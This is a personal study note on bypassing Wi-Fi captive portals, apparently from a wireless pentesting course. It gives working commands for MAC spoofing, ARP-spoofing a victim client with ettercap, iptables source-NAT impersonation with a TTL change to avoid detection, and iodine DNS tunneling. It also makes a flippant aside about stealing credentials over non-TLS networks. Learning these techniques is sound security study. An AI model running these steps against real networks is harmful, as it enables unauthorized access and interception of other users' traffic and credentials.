---
aliases:
  - captive portal
  - captive portals
---
# Bypassing Captive Portals
On OPN networks a *captive portal* is a web page which guests interact with that usually requires them to accept a TOS or enter credentials to give them access to the network.
## MAC Spoofing
[MAC](../../networking/OSI/2-datalink/MAC-addresses.md) spoofing is one way to bypass captive portals b/c *most captive portals use MAC addresses to identify guests*. By cloning the MAC address of an existent client, you can gain access to the network by impersonating it.
#### 1. Stop NetworkManager
```bash
sudo systemctl stop NetworkManager
```
#### 2. Change the MAC address
```bash
sudo ip link set dev <INTERFACE> address <new_mac_address>
```
OR
```bash
ip link set wlan2 down
macchanger -m <CLIENT_MAC>> <INTERFACE>
ip link set wlan2 up
```
#### 3. Connect
Once the MAC address is set, simply connect to the network. You can connect via the command line by creating the following `wifi-opn.conf` file:
```bash
network={
    ssid="SSID_NAME"
    key_mgmt=NONE
}
```
And then running `wpa-supplicant`:
```bash
sudo wpa_supplicant -i <INTERFACE> -c wifi-opn.conf
```
## IP Spoofing
Some captive portals identify clients via their [IP](../../networking/OSI/3-network/IP-addresses.md) address. 
#### 1. Enable IP Forwarding
This step allows the attacking device to function as a router and forward network packets b/w the victim and other devices
```bash
echo 1 > /proc/sys/net/IPv4/ip_forward
```
#### 2. Initiate a MitM
Use [ARP](../../networking/protocols/ARP.md) spoofing to initiate a man-in-the-middle attack using `ethercap`. `ethercap` is a command line tool that allows you to intercept and manipulate network traffic via ARP spoofing:
```bash
ettercap -T -q -i wlan0 -w dump -M ARP /<AUTHORIZED_CLIENT_IP>/ /<GATEWAY_IP>/
```
- `-T`: Uses text interface (Text Mode)
- `-q`: Runs in quiet mode
- `-i wlan0`: Specifies the network interface (wlan0 in this case; it may vary depending on the device)
- `-w dump`: Saves captured data in a file called dump
- `-M ARP`: Specifies that an ARP spoofing attack will be performed
- `/AUTHORIZED_CLIENT_IP/`: The IP address of the authenticated client (victim)
- `/GATEWAY_IP/`: The IP address of the gateway
#### 3. Spoof the authenticated AP w/ `iptables`
`iptables` is a powerful tool for managing Firewall rules on Linux, used here to manipulate IP traffic and spoof the IP of the authorized client after the Ettercap MitM attack. A Firewall rule is created to ensure outgoing traffic to the internet uses the spoofed IP address:
```bash
iptables -t nat -A OUTPUT -d ! >LAN> -j SNAT --to >AUTHORIZED_CLIENT_IP>
```
- `-t nat`: Indicates that the rule applies in the NAT (Network Address Translation) table
- `-A OUTPUT`: Adds a rule to the OUTPUT chain, which applies to outgoing traffic from the attacking device
- `-d ! <LAN>`: Applies the rule to all destinations not in the local network (lan)
- `-j SNAT --to >AUTHORIZED_CLIENT_IP>`: Performs Source NAT (SNAT), changing the source address to the authorized client's IP
Increase the TTL by one to avoid detection:
```bash
iptables -t mangle -A FORWARD -d <AUTHORIZED_CLIENT_IP> -j TTL --ttl-inc 1
```
- `-t mangle`: Indicates that the rule applies in the mangle table, used for packet modifications
- `-A FORWARD`: Adds a rule to the FORWARD chain, which applies to traffic passing through the attacking device
- `-d <authorized_client_ip>`: Specifies that the rule affects traffic destined for the authenticated client's IP
- `-j TTL --ttl-inc 1`: Changes the Time-to-Live (TTL) value of the packets, increasing it by 1 to help obfuscate the traffic's origin and avoid detection
## Credential theft
IF THE NETWORK ISN"T USING TLS YOU CAN JACK DEM CREDENTIALS WOW
## DNS Tunnel
You can use a DNS tunnel like [iodine](https://github.com/yarrick/iodine), which has a server and client configuration. To set up a [DNS](../../networking/DNS/DNS.md) tunnel, a machine with access to the internet is needed (for running the server), as well as a domain for queries.

The configuration includes the following:
1. The server (like iodine) is installed on a computer with internet access
2. The client (also iodine) is installed on the client device
3. The clients sends DNS requests to the server 
4. The server extracts data from the requests and responds with data encapsulated in DNS responses
5. The client receives the responses, decapsulates the data, and establishes the bi-directional tunnel
#### 1. Configure the zone file
This needs to be with a domain name you own and control. Add the following two lines to the zone file:
```bash
t1		IN	NS	t1ns.mydomain.com.		; note the dot!
t1ns		IN	A	10.15.213.99
```
- `NS`: this line is required to routes queries for the `t1` subdomain to the `t1ns` server. *Using a short name for the subdomain ensures more space available for the traffic data*. At the end of the `NS` line is the name of the iodined server. It *cannot be an IP address*, and it *must have an [A-record](../../networking/DNS/A-record.md)*.

Once the zone file is ready, restart the nameserver. Any DNS queries for domains *ending in `t1.mydomain.com`* will be sent to your iodined server.
#### 2. Start the server
Once the zone file is ready and the nameserver restarted, you can start the iodine server:
```bash
./iodined -f -P secretpassword 192.168.99.1 t1.mydomain.com
```
- `-f`: keeps iodine running in the foreground
- `-P`: the password you want to use, if you don't supply `-P`, you still have the option to set one in the command line
- `192.168.99.1`: this is the IP address inside the tunnel and can be from any range *which you aren't using*
- `test.com`: This is the assigned domain
#### 3. Start the client tunnel
For the client tunnel, all you really need is the domain name. The client tunnel interface will get an IP address close to the server's
```bash
iodine -f -P secretpassword t1.mydomain.com
```
- `-f`: keeps it running in the foreground
- `-P`: the password you set when you started the server
#### 4. Verify Connection
Once the tunnel is established, you should be able to *ping the IP address on the other side*. So from the client, `ping 192.168.99.1`, and from the server `ping 192.168.99.2`.

Additionally, you can test to see if the server is replying to [NS requests](../../networking/DNS/NS-record.md) to subdomains on the tunnel. For example, if your iodined subdomain is `t1.mydomain.com`, and you send a NS request to `foo123.t1.mydomain.com`, then you should see the following response:
```bash
% dig -t NS foo123.t1.mydomain.com
ns.io.citronna.de.
```
Additionally, the server will answer requests starting with `z` for the following request types (the answer will be garbled text):
```bash
dig -t TXT z456.t1.mydomain.com
dig -t SRV z456.t1.mydomain.com
dig -t CNAME z456.t1.mydomain.com
```

> [!Resources]
> - [GitHub - yarrick/iodine: Official git repo for iodine dns tunnel · GitHub](https://github.com/yarrick/iodine)
> - [Wifi Challenge Academy](https://academy.wifichallenge.com/courses/take/certified-wifichallenge-professional-cwp/texts/57442980-introduction)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.

